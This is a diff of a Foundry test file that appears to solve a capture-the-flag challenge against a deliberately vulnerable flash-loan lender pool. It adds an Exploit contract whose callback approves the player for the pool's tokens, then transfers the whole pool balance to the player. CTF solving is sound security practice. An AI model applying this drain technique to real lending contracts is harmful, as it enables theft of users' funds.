@@ -8,6 +8,9 @@ import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
 import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
 
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+
 
 contract Challenge1Test is Test {
     InSecureumLenderPool target; 
@@ -33,17 +36,18 @@ contract Challenge1Test is Test {
         //////////////////////////////*/
 
         //=== this is a sample of flash loan usage
-        FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();
+        Exploit exploit = new Exploit();
 
         target.flashLoan(
-          address(_flashLoanReceiver),
+          address(exploit),
           abi.encodeWithSignature(
-            "receiveFlashLoan(address)", player
+            "Hack(address)", player
           )
         );
-        //===
 
-        //============================//
+        uint256 balance = token.balanceOf(address(target));
+
+        token.transferFrom(address(target), player, balance);
 
         vm.stopPrank();
 
@@ -76,4 +80,14 @@ contract FlashLoandReceiverSample {
 
 // @dev this is the solution
 contract Exploit {
+    using Address for address;
+    using SafeERC20 for IERC20;
+
+    /// @dev Token contract address to be used for lending.
+    //IERC20 immutable public token;
+    IERC20 public token;
+
+    function Hack(address player) public {
+        token.approve(player, token.balanceOf(address(this)));
+    }
 }
